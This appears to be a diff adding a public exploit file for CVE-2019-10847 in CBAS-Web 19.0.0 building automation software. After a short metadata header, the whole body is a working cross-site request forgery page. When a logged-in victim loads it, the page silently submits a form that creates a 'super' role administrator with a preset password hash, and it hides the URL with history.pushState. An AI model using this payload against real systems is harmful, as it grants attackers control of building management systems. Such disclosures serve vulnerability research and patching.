@@ -1,0 +1,30 @@
+# Exploit Title: CBAS-Web 19.0.0 - Cross-Site Request Forgery (Add Super Admin)
+# Google Dork: NA
+# Date: 2019-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
+# Software Link: https://www.computrols.com/building-automation-software/
+# Version: 19.0.0
+# Tested on: NA
+# CVE : CVE-2019-10847
+# Advisory: https://applied-risk.com/resources/ar-2019-009
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+
+<!-- CSRF Add Super Admin -->
+<html>
+  <body>
+  <script>history.pushState('', 't00t', 'index.php')</script>
+    <form action="http://192.168.1.250/cbas/index.php?m=users&a=user_add_p" method="POST">
+      <input type="hidden" name="username_" value="Sooper" />
+      <input type="hidden" name="first" value="Mess" />
+      <input type="hidden" name="last" value="O'Bradovich" />
+      <input type="hidden" name="email" value="aa@bb.cc" />
+      <input type="hidden" name="password_" value="" />
+      <input type="hidden" name="notes" value="CSRFed" />
+      <input type="hidden" name="group_id" value="0" />
+      <input type="hidden" name="role" value="super" />
+      <input type="hidden" name="md5password" value="179edfe73d9c016b51e9dc77ae0eebb1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
